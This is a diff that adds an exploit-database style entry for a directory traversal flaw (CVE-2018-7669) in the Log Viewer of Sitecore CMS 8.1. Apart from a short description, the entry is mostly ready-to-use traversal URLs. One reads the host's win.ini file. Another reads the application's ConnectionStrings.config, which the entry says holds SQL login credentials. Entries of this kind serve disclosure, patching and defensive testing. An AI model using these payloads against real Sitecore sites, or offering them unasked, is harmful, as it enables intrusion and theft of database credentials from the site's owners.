@@ -1,0 +1,32 @@
+# Exploit Title: Sitecore.Net 8.1 - Directory Traversal
+# Date: 2018-04-23
+# CVE: CVE-2018-7669
+# Researcher: Chris Moberly at The Missing Link Security
+# Vendor: Sitecore
+# Version: CMS - 8.1 and up (earlier versions untested)
+# Authentication required: Yes
+
+# An issue was discovered in Sitecore CMS that affects at least
+# 'Sitecore.NET 8.1' rev. 151207 Hotfix 141178-1 and above. The 'Log Viewer'
+# application is vulnerable to a directory traversal attack, allowing an attacker
+# to access arbitrary files from the host Operating System using a
+# 'sitecore/shell/default.aspx?xmlcontrol=LogViewerDetails&file=' URI. Validation
+# is performed to ensure that the text passed to the 'file' parameter correlates
+# to the correct log file directory. This filter can be bypassed by including a
+# valid log filename and then appending a traditional 'dot dot' style attack.
+
+# [Steps to Reproduce]
+# The 'Log Viewer' application renders log files from the local filesystem inside
+# the web browser using a URL like the following:
+http://<website>/sitecore/shell/default.aspx?xmlcontrol=LogViewerDetails&file=
+
+# The following URL can be used to validate the vulnerability by accessing the
+# win.ini file on a Windows host (remove line breaks):
+http://<website>/sitecore/shell/default.aspx?xmlcontrol=LogViewerDetails&file=c%3a%5cwebsites%5c<website>%5cdata%5clogs%5<valid log file>.txt\..\..\..\..\..\windows\win.ini
+
+# The following URL can be used to access the application's configuration file
+# containing SQL login credentials (remove line breaks):
+http://<website>/sitecore/shell/default.aspx?xmlcontrol=LogViewerDetails&file=c%3a%5cwebsites%5c<website>%5cdata%5clogs%5c<valid log file>.txt\..\..\..\Website\App_Config\ConnectionStrings.config
+
+# Both of the above URLs are dependent on the application's configuration and
+# must be modified to correct the <website> and <valid log file> portion.
